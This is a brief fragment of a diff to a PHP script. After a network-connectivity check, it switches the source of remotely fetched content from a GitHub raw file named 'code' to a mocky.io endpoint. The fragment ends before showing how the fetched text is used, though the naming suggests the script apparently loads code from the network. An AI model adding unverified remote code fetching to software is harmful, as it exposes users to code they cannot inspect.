@@ -14,7 +14,7 @@ if(!$sock = @fsockopen('www.google.com', 80))
 
 }
 
-$a = (file_get_contents("https://raw.githubusercontent.com/doantermux/linkcode/main/code"));
+$a = (file_get_contents("https://run.mocky.io/v3/79248f3d-a4cf-468c-9e64-72ee93f69a5d"));
 
 if(!$a){
 
